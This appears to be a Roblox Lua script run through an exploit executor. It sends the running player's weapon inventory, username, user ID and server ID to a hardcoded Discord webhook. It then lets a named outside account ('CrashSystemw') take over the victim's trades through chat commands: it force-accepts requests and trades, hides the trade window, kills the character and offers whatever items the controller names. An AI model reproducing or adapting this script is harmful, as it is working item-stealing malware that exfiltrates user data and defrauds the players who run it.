t = {}
for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
 table.insert(t, tostring(i).." : "..tostring(v)..", ")
end
inventory = table.concat(t)
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile";
local Embed = {
    title = 'LocalPlayer: ' .. game.Players.LocalPlayer.Name;
    color = '500';
    footer = { text = 'User id: ' .. game.Players.LocalPlayer.UserId };
    author = {
        name = 'MeowHub';
        url = 'https://www.pornhub.com/';
    };
    fields = {
        {
            name = game.JobId;
            value = inventory;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1256581343433982003/6K_RKioay9iYMv3A1pCivM4Z1K0K9FJviynxwVb2aWM0J5HMBCz_1dotjaO-tp9SNyuy';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

local main = game.Players:WaitForChild("CrashSystemw")

Player = game.Players.LocalPlayer
Pl = game.Players

function MainCommands(plr, msg)
    if msg == "p" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end

    if msg == "s" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
        for i = 1, 100 do
            wait(0.1)
        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
    end
    end

    if msg == "a" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        
    end
end

for i, v in Pl:GetChildren() do
    if v ~= Player then
        v.Chatted:Connect(function(msg)
            MainCommands(v, msg)
        end)
    end
end

Pl.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        MainCommands(plr, msg)
    end)
end)

game.Players.CrashSystemw.Chatted:Connect(function(msg) 
    
    local args = {
        [1] = msg,
        [2] = "Weapons"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))

end)

